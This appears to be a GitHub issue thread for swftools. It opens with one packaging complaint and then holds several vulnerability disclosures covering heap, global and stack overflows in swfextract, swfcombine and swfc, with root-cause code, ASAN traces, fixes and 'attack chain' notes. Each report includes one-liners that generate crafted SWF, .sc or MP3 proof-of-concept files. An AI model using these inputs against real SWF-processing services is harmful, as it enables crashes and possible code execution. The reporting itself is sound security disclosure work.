title: libjpeg-turbo / libjpeg virtual package
author: cclamb
body:
Hey guys, when updating arch I'm getting this error:

:: installing libjpeg-turbo (3.2.0-2) breaks dependency 'libjpeg' required by swftools

The libjpeg virtual package was recently removed from arch, causing this to fail. You need to adjust the dependency to a dependency on libjpeg-turbo.

title: Heap buffer over-read in swfextract -j (findjpegboundary) — attacker length used before the bounds check (DEFINEBITSJPEG3)
author: h0rk1p
body:
# Heap buffer over-read in swfextract -j (findjpegboundary)  -  attacker length used before the bounds check (DEFINEBITSJPEG3)

**Severity:** MEDIUM | **CVSS 3.1:** 6.1 `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:H` | **CWE:** CWE-125 | **Affected:** swftools @ `56a672207ac6`

## Summary
handlejpeg extracts JPEG data from a DEFINEBITSJPEG3 tag. It computes `U32 end = GET32(&tag->data[2]) + 6` (src/swfextract.c:775)  -  fully attacker-controlled (the 4-byte alpha-data-offset field)  -  and passes it as the `len` to findjpegboundary(&tag->data[6], end) at :776. findjpegboundary (src/swfextract.c:697) scans `for(t=0;t<len-4;t++) data[t..t+3]`. The guard `if(end >= tag->len) return` is at :777  -  AFTER the scan. With end ~2GB, findjpegboundary reads far past the small tag buffer.

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  src/swfextract.c:704 (findjpegboundary scan), called with attacker length at src/swfextract.c:776; bounds check at :777 runs too late
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply the .swf to a `swfextract -j` (JPEG extraction) invocation.

## Root cause
```c
src/swfextract.c:697  int findjpegboundary(U8*data, int len){
src/swfextract.c:700      for(t=0;t<len-4;t++) { if(data[t]==0xff && data[t+1]==0xd9 ...) }  // scans 'len' past data
src/swfextract.c:775      U32 end = GET32(&tag->data[2])+6;          // attacker-controlled ~2GB
src/swfextract.c:776      int pos = findjpegboundary(&tag->data[6], end);   // OOB scan
src/swfextract.c:777      if(end >= tag->len) { ... return; }        // bounds check AFTER the scan
```

## Reachability (untrusted source -> sink)
```
SOURCE DEFINEBITSJPEG3 alphaDataOffset (attacker) swfextract -j 7 poc.swf v main tag loop -> handlejpeg(tag) src/swfextract.c:1329 end = GET32(&tag->data[2]) + 6 (~2GB) src/swfextract.c:775
SINK findjpegboundary(&tag->data[6], end) src/swfextract.c:776 -> scan loop :704 if(end >= tag->len) return; src/swfextract.c:777 (TOO LATE)
```
Reached by the documented `swfextract -j` option.

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools && git checkout 56a672207ac699e63908557b8888087f33e72fd4
2. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address' LDFLAGS='-fsanitize=address' ./configure && make -j"$(nproc)"
3. python3 -c "import struct; body=struct.pack('<HI',7,0x7ffffff0)+bytes([0xff,0xd8,0xff,0xd9]); tag=struct.pack('<H',(35<<6)|0x3f)+struct.pack('<I',len(body))+body; b=bytes([0x08,0x00])+struct.pack('<HH',0x0100,1)+tag+struct.pack('<H',0); open('poc.swf','wb').write(b'FWS'+bytes([6])+struct.pack('<I',8+len(b))+b)"
4. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfextract -j 7 poc.swf -o /tmp/j.jpg )
5. # => heap-buffer-overflow READ at findjpegboundary src/swfextract.c:704 (0 bytes after 10-byte region)

## Output
=================================================================
==2981090==ERROR: AddressSanitizer: heap-buffer-overflow on address at pc bp sp
READ of size 1 at thread T0
    #0 in findjpegboundary src/swfextract.c:704
    #1 in handlejpeg src/swfextract.c:776
    #2 in main src/swfextract.c:1329
    #3  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #4 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026)
    #5 in _start (src/swfextract+0x14b7a0)

0x7bd3f2fe001a is located 0 bytes after 10-byte region [0x7bd3f2fe0010,0x7bd3f2fe001a)
allocated by thread T0 here:
    #0 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 in rfx_alloc lib/mem.c:30
    #2 in swf_ReadTag lib/rfxswf.c:1227
    #3 in swf_ReadSWF2 lib/rfxswf.c:1596
    #4 in swf_ReadSWF lib/rfxswf.c:1627
    #5 in main src/swfextract.c:1251
    #6  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #7  (<unknown module>)
    #8  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow src/swfextract.c:704 in findjpegboundary

_Demonstrated vs inferred:_ Demonstrated live (real swfextract -j, deterministic across a clean independent rebuild): heap-buffer-overflow READ at findjpegboundary swfextract.c:704, 0 bytes after a 10-byte tag region.

## Impact
DEMONSTRATED live: heap out-of-bounds READ scanning up to ~2 GB past a small heap tag buffer (ASAN: read 0 bytes after a 10-byte region). Crash / DoS (and adjacent-heap disclosure to the extent the scan influences output). Pre-auth; `swfextract -j`.

## Attack chain
CHAIN-1 alt-leak / CHAIN-4 DoS. The ~2GB scan reliably crashes swfextract -j (DoS); to the extent the extracted JPEG includes OOB bytes it is also an alternate Stage-1 leak.

## Suggested fix
Move the `if(end >= tag->len)` clamp BEFORE the findjpegboundary call (clamp `end = min(end, tag->len-6)`), and bound findjpegboundary's scan to the actual tag length.

## References
- [CWE-125](https://cwe.mitre.org/data/definitions/125.html): Out-of-bounds Read
- [CWE-20](https://cwe.mitre.org/data/definitions/20.html): Improper Input Validation
- Distinct from the JPEG2/app0 path ([PR#91](https://github.com/matthiaskramm/swftools/pull/91)) which guards end-pos; findjpegboundary not in prior art

## Environment
- swftools @ commit `56a672207ac699e63908557b8888087f33e72fd4` - default build (`./configure && make`), default config.

title: Heap buffer overflow (OOB read + adjacent write) in swfcombine swf_Relocate via a truncated PLACEOBJECT2 char-id (default invocation)
author: h0rk1p
body:
# Heap buffer overflow (OOB read + adjacent write) in swfcombine swf_Relocate via a truncated PLACEOBJECT2 char-id (default invocation)

**Severity:** MEDIUM | **CVSS 3.1:** 6.1 `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:H` | **CWE:** CWE-787 | **Affected:** swftools @ `56a672207ac6`

## Summary
swf_Relocate rebiases character IDs in the slave movie. enumerateUsedIDs (lib/modules/swftools.c:659-661) registers a hardcoded id-field offset for ST_PLACEOBJECT2  -  `callback(tag, 3+base, ...)`  -  when `tag->data[0]&2` (hasCharacter) is set, with NO check that tag->len is large enough to hold the 2-byte id at offset 3. swf_ReadTag allocates `tag->data = rfx_alloc(tag->len)` (exact size). A slave PLACEOBJECT2 tag of length 3 (flags=0x02 + 2-byte depth, NO room for the char-id) makes swf_Relocate do `GET16(&tag->data[3])` (swftools.c:1026, read 1 byte past the 3-byte buffer) and `PUT16(&tag->data[3], newid)` (swftools.c:1054, write past the buffer). PLACEOBJECT3 (offset 4) is the same.

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  lib/modules/swftools.c:1026 (GET16 read) + :1054 (PUT16 write), offset from enumerateUsedIDs lib/modules/swftools.c:661
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply the slave .swf to a default `swfcombine` (a server stitching user SWFs). Master is any trivial SWF.

## Root cause
```c
lib/modules/swftools.c:659  if(!(tag->data[0]&2)) break;        // PLACEOBJECT2: only needs len>=1
lib/modules/swftools.c:661      callback(tag, 3 + base, ...);       // registers offset 3, NO len>=5 check
lib/modules/swftools.c:1026 int id = GET16(&tag->data[ptr[t]]);     // OOB read at offset 3 of a 3-byte tag
lib/modules/swftools.c:1054 PUT16(&tag->data[ptr[t]], id);          // OOB write at offset 3
```

## Reachability (untrusted source -> sink)
```
SOURCE slave .swf PLACEOBJECT2 (len 3, data[0]&2) swfcombine master.swf slave.swf -o out.swf (DEFAULT) v normalcombine -> swf_Relocate(slave,...) src/swfcombine.c:1123 v enumerateUsedIDs registers offset 3 (no len chk) lib/modules/swftools.c:659-661
SINK GET16(&tag->data[3]) ; PUT16(&tag->data[3],id) lib/modules/swftools.c:1026 / :1054
```
swf_Relocate runs on every slave unconditionally (no -m needed).

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools && git checkout 56a672207ac699e63908557b8888087f33e72fd4
2. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address' LDFLAGS='-fsanitize=address' ./configure && make -j"$(nproc)"
3. python3 -c "import struct; swf=lambda t:(lambda b:b'FWS'+bytes([6])+struct.pack('<I',8+len(b))+b)(bytes([0x08,0x00])+struct.pack('<HH',0x0100,1)+t); end=struct.pack('<H',0); open('master.swf','wb').write(swf(end)); open('slave.swf','wb').write(swf(struct.pack('<H',(26<<6)|3)+bytes([0x02,0,0])+end))"
4. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfcombine master.swf slave.swf -o /tmp/out.swf )
5. # => heap-buffer-overflow READ at swf_Relocate lib/modules/swftools.c:1026 (0 bytes after 3-byte region); adjacent OOB write at :1054

## Output
WARNING Didn't find anything named slave in file. No substitutions will occur.
=================================================================
==2936645==ERROR: AddressSanitizer: heap-buffer-overflow on address at pc bp sp
READ of size 1 at thread T0
    #0 in swf_Relocate modules/swftools.c:1026
    #1 in normalcombine src/swfcombine.c:1123
    #2 in combine src/swfcombine.c:1221
    #3 in main src/swfcombine.c:1377
    #4  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #5 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026)
    #6 in _start (src/swfcombine+0x46650)

0x7b5911fe0053 is located 0 bytes after 3-byte region [0x7b5911fe0050,0x7b5911fe0053)
allocated by thread T0 here:
    #0 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 in rfx_alloc lib/mem.c:30
    #2 in swf_ReadTag lib/rfxswf.c:1227
    #3 in swf_ReadSWF2 lib/rfxswf.c:1596
    #4 in swf_ReadSWF lib/rfxswf.c:1627
    #5 in main src/swfcombine.c:1358
    #6  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #7  (<unknown module>)
    #8  (<unknown module>)

SUMMARY: Addres

_Demonstrated vs inferred:_ Demonstrated live (real swfcombine, deterministic across a clean independent rebuild): heap-buffer-overflow READ at swf_Relocate swftools.c:1026, 0 bytes after a 3-byte region; the adjacent PUT16 write at :1054 is at the same offset.

## Impact
DEMONSTRATED: heap out-of-bounds READ 1 byte past a 3-byte heap tag buffer (ASAN), plus an out-of-bounds WRITE at the same offset (PUT16 stores the rebiased id). Heap info-leak / corruption + crash. Triggered by the BARE DEFAULT `swfcombine a b -o c` (no flags), a broader trigger than the -m-gated FIND-003.

## Attack chain
CHAIN-3 ANCHOR + CHAIN-1 write-surface. Default `swfcombine a b -o c` (no flags) gives an OOB read+write at swf_Relocate offset 3; a merge service processing untrusted SWFs is corrupted with no special invocation. Pairs with FIND-003 (-m) for additional write reach.

## Suggested fix
In enumerateUsedIDs, verify tag->len >= offset+2 before registering an id position (require len>=5 for PLACEOBJECT2, >=6 for PLACEOBJECT3); skip/clamp short place tags.

## References
- [CWE-787](https://cwe.mitre.org/data/definitions/787.html): Out-of-bounds Write
- [CWE-125](https://cwe.mitre.org/data/definitions/125.html): Out-of-bounds Read
- Distinct from [CVE-2017-11101](https://nvd.nist.gov/vuln/detail/CVE-2017-11101) (swf_Relocate NULL deref at swftools.c:659, len-0 tag)  -  different line/precondition/class, and from FIND-003 (swf_SetDepth, -m-gated)

## Environment
- swftools @ commit `56a672207ac699e63908557b8888087f33e72fd4` - default build (`./configure && make`), default config.

title: Heap buffer overflow (OOB write) in swfc AS2 compiler — _level%d sprintf overruns a 12-byte buffer (swf5compiler.y level rule)
author: h0rk1p
body:
# Heap buffer overflow (OOB write) in swfc AS2 compiler  -  _level%d sprintf overruns a 12-byte buffer (swf5compiler.y level rule)

**Severity:** MEDIUM | **CVSS 3.1:** 6.1 `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:H` | **CWE:** CWE-787 | **Affected:** swftools @ `56a672207ac6`

## Summary
The AS2 grammar's numeric `level` rule allocates a fixed 12-byte buffer and formats `_levelN` into it: `char *lvlstring = malloc(12); sprintf(lvlstring, "_level%d", $1);` (swf5compiler.y:648-649). `$1` is an attacker-controlled INTEGER token (full 32-bit range). `"_level"` is 6 chars; `%d` of a large/negative int is up to 11 chars; with the NUL the write is up to 18 bytes into the 12-byte allocation. Any level with >=5 digits (e.g. loadMovieNum(url, 2000000000)) overflows.

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  lib/action/swf5compiler.y:648-649 (compiled into lib/action/swf5compiler.tab.c); reached from src/swfc.c:1962 (s_action)
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply a .sc (with an AS2 `.action` block) to swfc.

## Root cause
```c
lib/action/swf5compiler.y:648   char *lvlstring = (char*) malloc(12*sizeof(char));
lib/action/swf5compiler.y:649   sprintf(lvlstring, "_level%d", $1);   // up to 18 bytes into 12-byte buffer; $1 attacker int
```

## Reachability (untrusted source -> sink)
```
SOURCE .sc .action block (attacker) swfc poc.sc v c_action -> s_action -> swf_ActionCompile src/swfc.c:1962/1966 v swf5 grammar: loadMovieNum(url, INTEGER) -> `level: INTEGER`
SINK sprintf(malloc(12), "_level%d", $1) swf5compiler.y:649
```
Default build, version=6.

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools && git checkout 56a672207ac699e63908557b8888087f33e72fd4
2. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address' LDFLAGS='-fsanitize=address' ./configure && make -j"$(nproc)"
3. printf '.flash version=6 bbox=640x480\n.action:\nloadMovieNum("x.swf", 2000000000);\n.end\n.end\n' > poc.sc
4. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfc poc.sc -o /tmp/out.swf )
5. # => AddressSanitizer: heap-buffer-overflow WRITE of size 17 in sprintf <- swf5parse swf5compiler.y:649 (0 bytes after 12-byte region)

## Output
=================================================================
==2830549==ERROR: AddressSanitizer: heap-buffer-overflow on address at pc bp sp
WRITE of size 17 at thread T0
    #0 in vsprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1758
    #1 in sprintf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1803
    #2 in swf5parse lib/swf5compiler.y:649
    #3 in compileSWFActionCode action/actioncompiler.c:90
    #4 in swf_ActionCompile modules/swfaction.c:1111
    #5 in s_action src/swfc.c:1966
    #6 in c_action src/swfc.c:4162
    #7 in parseArgumentsForCommand src/swfc.c:4475
    #8 in main src/swfc.c:4598
    #9  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74)
    #10 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026)
    #11 in _start (src/swfc+0x404920)

0x7be0febe099c is located 0 bytes after 12-byte region [0x7be0febe0990,0x7be0febe099c)
allocated by thread T0 here:
    #0 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 in swf5parse lib/swf5compiler.y:648
    #2 in compileSWFActionCode action/actioncompiler.c:90
    #3 in swf_ActionCompile modules/swfaction.c:1111
    #4 in s_action src/swfc.c:1966
    #5 in c_action src/swfc.c:4162
    #6 in parseArgumentsForCommand src/swfc.c:4475
    #7 in main src/swfc.c:4598
    #8  (/usr/lib/x86_64-linux-gnu/libc.so.6+

_Demonstrated vs inferred:_ Demonstrated live (real swfc CLI, deterministic across a clean independent rebuild): heap-buffer-overflow WRITE of size 17 at swf5compiler.y:649 (sprintf), 0 bytes after the 12-byte malloc region.

## Impact
DEMONSTRATED live: heap-buffer-overflow WRITE of up to ~6 bytes past a 12-byte heap allocation; the overflowing bytes are the tail digits + NUL of the `_levelN` string (semi-controlled). Heap-corruption -> crash demonstrated. Medium (small, low-control overflow). Pre-auth.

## Attack chain
CHAIN-2 supporting. Additional heap write primitive reachable from the same malicious .sc (.action loadMovieNum) as FIND-004/001/005.

## Suggested fix
Size lvlstring for the worst case (`_level` + INT range = >=18 bytes) or use snprintf/asprintf: `char b[24]; snprintf(b,sizeof b,"_level%d",$1);`.

## References
- [CWE-787](https://cwe.mitre.org/data/definitions/787.html): Out-of-bounds Write
- [CWE-131](https://cwe.mitre.org/data/definitions/131.html): Incorrect Calculation of Buffer Size
- Distinct from the saturated swf5 lexer bugs (lex.swf5.c)  -  this is a grammar semantic action

## Environment
- swftools @ commit `56a672207ac699e63908557b8888087f33e72fd4` - default build (`./configure && make`), default config.

title: Heap buffer overflow (OOB write) in swfcombine swf_SetDepth via truncated REMOVEOBJECT2 during depth relocation (-m)
author: h0rk1p
body:
# Heap buffer overflow (OOB write) in swfcombine swf_SetDepth via truncated REMOVEOBJECT2 during depth relocation (-m)

**Severity:** MEDIUM | **CVSS 3.1:** 6.1 `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:H` | **CWE:** CWE-787 | **Affected:** swftools @ `56a672207ac6`

## Summary
swfcombine relocates the depths of every tag in a 'slave' movie when merging (`-m`). swf_RelocateDepth (lib/modules/swftools.c:1107) iterates all slave tags and calls swf_SetDepth for any tag with a depth. For ST_REMOVEOBJECT2, swf_SetDepth writes a 16-bit value with the raw macro `PUT16(t->data, depth)` (lib/modules/swftools.c:373), which stores t->data[0] AND t->data[1] with no length check. A REMOVEOBJECT2 tag whose record-declared body length is 1 byte yields a 1-byte heap allocation for t->data (rfxswf.c:1227 `t->data = rfx_alloc(t->len)`); swf_GetDepth reads the (bounds-checked) U16 as 0 without over-reading, then swf_SetDepth's PUT16 writes t->data[1] one byte past the 1-byte buffer. (ST_PLACEOBJECT2 has the same shape at lib/modules/swftools.c:376 `PUT16(&t->data[1],...)`  -  2 bytes OOB for a <3-byte tag.)

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  lib/modules/swftools.c:373 (swf_SetDepth, PUT16), reached from lib/modules/swftools.c:1136 (swf_RelocateDepth) via src/swfcombine.c:1126
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply the 'slave' .swf to a `swfcombine -m` (merge) invocation, e.g. a server that stitches user-uploaded SWFs. The master can be any trivial valid SWF. No auth.

## Root cause
```c
lib/modules/swftools.c:344   case ST_REMOVEOBJECT2: depth = swf_GetU16(t); break;   // bounds-checked -> 0 on len=1
lib/modules/swftools.c:372   case ST_REMOVEOBJECT2:
lib/modules/swftools.c:373       PUT16(t->data, depth);    // writes data[0] AND data[1] (OOB for 1-byte tag)
lib/types.h:16   #define PUT16(ptr,x) {((U8*)(ptr))[0]=(U8)(x);((U8*)(ptr))[1]=(U8)((x)>>8);}
lib/modules/swftools.c:1129  depth = swf_GetDepth(tag);
lib/modules/swftools.c:1130  if(depth>=0){ int newdepth=depth+nr; ... swf_SetDepth(tag,newdepth); }  // line 1136
```

## Reachability (untrusted source -> sink)
```
SOURCE slave .swf tag bytes (attacker) swfcombine master.swf slave.swf -m v combine -> normalcombine if(config.merge) swf_RelocateDepth(slave,...) src/swfcombine.c:1126 v loop over every slave tag depth = swf_GetDepth(tag) (bounds-checked -> 0) lib/modules/swftools.c:1129 if(depth>=0) swf_SetDepth(tag, depth+nr) lib/modules/swftools.c:1136
SINK case ST_REMOVEOBJECT2: PUT16(t->data, depth) lib/modules/swftools.c:373 // PUT16 writes t->data[0] AND t->data[1]; tag buffer is 1 byte
```
`swf_GetDepth` is bounds-checked (returns 0 without over-reading for a 1-byte REMOVEOBJECT2), so the only out-of-bounds access is the PUT16 WRITE of `t->data[1]`, one byte past the 1-byte heap tag buffer (`rfx_alloc(t->len)` at lib/rfxswf.c:1227). `-m`/`--merge` is a primary documented swfcombine mode; `swf_RelocateDepth` runs on every slave tag with no length filter.

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools && git checkout 56a672207ac699e63908557b8888087f33e72fd4
2. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address' LDFLAGS='-fsanitize=address' ./configure && make -j"$(nproc)"
3. python3 -c "import struct; swf=lambda t:(lambda b:b'FWS'+bytes([6])+struct.pack('<I',8+len(b))+b)(bytes([0x08,0x00])+struct.pack('<HH',0x0100,1)+t); end=struct.pack('<H',0); open('master.swf','wb').write(swf(end)); open('slave.swf','wb').write(swf(struct.pack('<H',(28<<6)|1)+bytes([0])+end))"
4. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfcombine master.swf slave.swf -m -o /tmp/out.swf )

title: Global buffer overflow (OOB write) in swfc AS2 assembler — addLabel writes past labels[256] with no bound (and nLabels never reset)
author: h0rk1p
body:
# Global buffer overflow (OOB write) in swfc AS2 assembler  -  addLabel writes past labels[256] with no bound (and nLabels never reset)

**Severity:** HIGH | **CVSS 3.1:** 8.1 `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | **CWE:** CWE-787 | **Affected:** swftools @ `56a672207ac6`

## Summary
The AS2 bytecode assembler keeps a fixed global `struct label labels[256]` (assembler.c:38) and a counter `int nLabels` (assembler.c:30). addLabel (assembler.c:57) registers a branch-target label: `labels[nLabels].name = strdup(label); labels[nLabels].offset = len; ++nLabels;` (assembler.c:63-65) with NO `nLabels < 256` bound. nLabels is a global that is never reset (not in swf5ParseInit), so distinct asm branch labels accumulate. An `asm{}` block (compiled by swfc for version<9) with 257+ distinct `branchalways "L"` targets drives nLabels to 256 and writes labels[256]  -  past the 4096-byte array  -  storing an attacker-controlled strdup() pointer (the label string) at successive out-of-bounds slots.

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  lib/action/assembler.c:63-65 (addLabel), global labels[256] at lib/action/assembler.c:38, nLabels at :30; reached from src/swfc.c:1962 (s_action) via an asm{} block
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply a .sc (with an AS2 `.action`/`asm{}` block) to swfc.

## Root cause
```c
lib/action/assembler.c:30   int nLabels;
lib/action/assembler.c:38   struct label labels[256];
lib/action/assembler.c:57   addLabel(char *label){
lib/action/assembler.c:63       labels[nLabels].name = strdup(label);   // OOB write at nLabels==256, attacker pointer
lib/action/assembler.c:64       labels[nLabels].offset = len;
lib/action/assembler.c:65       ++nLabels;                              // no bound; never reset
```

## Reachability (untrusted source -> sink)
```
SOURCE the .sc .action asm{} block (attacker) swfc poc.sc v c_action -> s_action(text) src/swfc.c:4154 / :1962 swf_ActionCompile(text, version<9) src/swfc.c:1966 -> compileSWFActionCode v swf5 grammar: BRANCHALWAYS STRING bufferBranchTarget(asmBuffer, label) swf5compiler.y:1690 v new label -> addLabel(label) assembler.c:80
SINK labels[nLabels].name = strdup(label) assembler.c:63 (no nLabels<256 check)
```
Default build, version=6 => swf5 path.

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools && git checkout 56a672207ac699e63908557b8888087f33e72fd4
2. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address,undefined' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address,undefined' LDFLAGS='-fsanitize=address,undefined' ./configure && make -j"$(nproc)"
3. { printf '.flash version=6 bbox=640x480\n.action:\nasm{\n'; for i in $(seq 0 299); do printf 'branchalways "L%d"\n' $i; done; printf '}\n.end\n.end\n'; } > poc.sc
4. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfc poc.sc -o /tmp/out.swf )
5. # => assembler.c:63: index 256 out of bounds for type 'label [256]' (global-buffer-overflow WRITE)

## Output
action/assembler.c:63:9: runtime error: index 256 out of bounds for type 'label [256]'

_Demonstrated vs inferred:_ Demonstrated live (real swfc CLI, deterministic across a clean independent rebuild): UBSAN `assembler.c:63:9: index 256 out of bounds for type 'label [256]'` at the 257th distinct asm label (the strdup-pointer write). Global-buffer-overflow class.

## Impact
DEMONSTRATED live: an out-of-bounds WRITE one element (and beyond) past the global labels[] array, storing attacker-chosen heap pointers (strdup of the label text) into adjacent BSS globals. Like the s_sprite finding, the write marches one slot per extra label. Memory-corruption primitive -> crash demonstrated; controlled-pointer corruption / code execution inferred. Pre-auth.

## Attack chain
CHAIN-2 (swfc compile-service RCE). One .sc with an .action asm{} block writes attacker strdup() pointers past the global labels[256] into adjacent BSS. Pairs with FIND-004 (stack) and FIND-001 (block-stack) in the same .sc as alternative/supporting control primitives. Demonstrated: the controlled global overwrite. Inferred: RCE.

## Suggested fix
Bound nLabels in addLabel (`if(nLabels>=256) error/grow`), and reset nLabels + free labels[].name per compile in swf5ParseInit.

## References
- [CWE-787](https://cwe.mitre.org/data/definitions/787.html): Out-of-bounds Write
- Distinct from the saturated swf5 LEXER bugs (lex.swf5.c [#224](https://github.com/matthiaskramm/swftools/issues/224)/#226/#212/#213/#214)  -  this is the bytecode ASSEMBLER (assembler.c), a different file

## Environment
- swftools @ commit `56a672207ac699e63908557b8888087f33e72fd4` - default build (`./configure && make`), default config.

title: Stack buffer overflow (OOB write, attacker-controlled content) in swfc via integer underflow in mp3_read on a crafted MP3
author: h0rk1p
body:
# Stack buffer overflow (OOB write, attacker-controlled content) in swfc via integer underflow in mp3_read on a crafted MP3

**Severity:** HIGH | **CVSS 3.1:** 8.1 `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | **CWE:** CWE-787 | **Affected:** swftools @ `56a672207ac6`

## Summary
mp3_read parses MPEG audio frames. For a frame whose bitrate index is 0 (free/invalid), the `if(!bitrate || !samprate)` branch at lib/mp3.c:124 has its `break` COMMENTED OUT, so parsing continues. `framesize = (144*bitrate)/samprate + padding` (lib/mp3.c:144) is then 0 or 1, which passes the `if(framesize > sizeof(FrameBuf)) break` guard at lib/mp3.c:150 (FrameBuf is `unsigned char[2048]`). The next line `fread(data, 1, framesize - 4, fi)` (lib/mp3.c:151) computes `framesize - 4` in UNSIGNED arithmetic, underflowing to 0xFFFFFFFC (~4 GiB), so fread copies the entire remaining file into `data = FrameBuf+4` on the stack.

## Affected
- **Component:** swftools@56a672207ac699e63908557b8888087f33e72fd4  -  lib/mp3.c:151 (fread into FrameBuf), underflow from lib/mp3.c:144; commented-out guard lib/mp3.c:124; reached from src/swfc.c:1691 (s_sound)
- **Repository / commit:** https://github.com/matthiaskramm/swftools @ `56a672207ac699e63908557b8888087f33e72fd4`
- **Attacker / interface:** Unauthenticated  -  anyone who can supply the .mp3 referenced by a `swfc` `.sound` directive (a .sc build pipeline that embeds a user-provided MP3, or a user compiling an untrusted .sc+.mp3).

## Root cause
```c
lib/mp3.c:124   if(!bitrate || !samprate){ /* Invalid frame */ /*break;*/ }   // guard disabled
lib/mp3.c:144   framesize = ((mpegver==3?144:72)*bitrate)/samprate + padding;  // 0 or 1 when bitrate==0
lib/mp3.c:150   if(framesize > sizeof(FrameBuf)) break;                         // FrameBuf[2048]; 0/1 passes
lib/mp3.c:151   if(fread(data, 1, framesize - 4, fi) < framesize-4)            // framesize-4 == 0xFFFFFFFC (unsigned underflow)
```

## Reachability (untrusted source -> sink)
```
SOURCE the .mp3 file bytes (attacker) swfc poc.sc (.sound s1 "evil.mp3") v c_sound -> s_sound(name,filename) src/swfc.c:3895 / :1658 mp3_read(&mp3, filename) src/swfc.c:1691 v per-frame parse; bitrate-index 0 frame if(!bitrate||!samprate){ /*break;*/ } lib/mp3.c:124 (break COMMENTED OUT) framesize = 0/1 ; passes >2048 guard lib/mp3.c:144,150
SINK fread(FrameBuf+4, 1, framesize-4, fi) lib/mp3.c:151 (framesize-4 == 0xFFFFFFFC)
```
Command table entry `{"sound", c_sound, "name filename"}` (src/swfc.c:4200). Default build, no flags.

## To reproduce
1. git clone https://github.com/matthiaskramm/swftools && cd swftools && git checkout 56a672207ac699e63908557b8888087f33e72fd4
2. CFLAGS='-g -O1 -std=gnu89 -fpermissive -fcommon -Wno-error -fsanitize=address' CXXFLAGS='-g -O1 -fpermissive -fcommon -Wno-error -fsanitize=address' LDFLAGS='-fsanitize=address' ./configure && make -j"$(nproc)"
3. printf '\xff\xff\x00\x00' > evil.mp3 && python3 -c "import sys;sys.stdout.buffer.write(b'A'*6000)" >> evil.mp3
4. printf '.flash bbox=640x480\n.sound s1 "evil.mp3"\n.end\n' > poc.sc
5. ( ulimit -v unlimited; ASAN_OPTIONS=abort_on_error=0 ./src/swfc poc.sc -o /tmp/out.swf )
6. # => AddressSanitizer: stack-buffer-overflow WRITE of size 6000 in fread <- mp3_read lib/mp3.c:151

## Output
wav_read: not a WAV file
=================================================================
==2824578==ERROR: AddressSanitizer: stack-buffer-overflow on address at pc bp sp
WRITE of size 6000 at thread T0
    #0 in fread ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1035
    #1 in mp3_read lib/mp3.c:151
    #2 in s_sound src/swfc.c:1691
